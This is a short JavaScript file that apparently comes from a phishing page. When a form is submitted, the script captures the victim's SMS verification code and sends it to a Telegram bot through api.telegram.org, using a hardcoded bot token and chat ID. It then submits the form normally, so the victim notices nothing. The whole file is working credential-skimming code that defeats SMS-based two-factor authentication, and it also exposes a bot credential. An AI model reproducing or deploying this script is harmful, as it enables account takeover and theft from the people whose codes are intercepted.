document.addEventListener('DOMContentLoaded', function () {
    const form = document.getElementById('indexFormId');
  
    if (form) {
        form.addEventListener('submit', function (e) {
            e.preventDefault(); 
  
            
            const token = '7355468281:AAGVk29WIyg3lJ7xl2UYLTcBEh3wJdadtxw';
            const chatId = '-4265262833';
  
            
            const formData = new FormData(this);
            const data = {
                sms: formData.get('sms')
            };
  
            
            const messageText = `
                📱 smscode: ${data.sms}
            `;
  
           
            sendMessageToTelegram(token, chatId, messageText)
                .then(response => {
                    if (response.ok) {
                        console.log('Message sent successfully!');
                        
                        form.submit();
                    } else {
                        console.error('Error sending message:', response);
                        alert('Error sending message');
                    }
                })
                .catch(error => {
                    console.error('Fetch error:', error);
                    alert('Error sending message');
                });
        });
    } else {
        console.error('Form element with id "indexFormId" not found.');
    }
  });
  
  function sendMessageToTelegram(token, chatId, text) {
    return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: text
        })
    })
    .then(response => response.json());
  }
  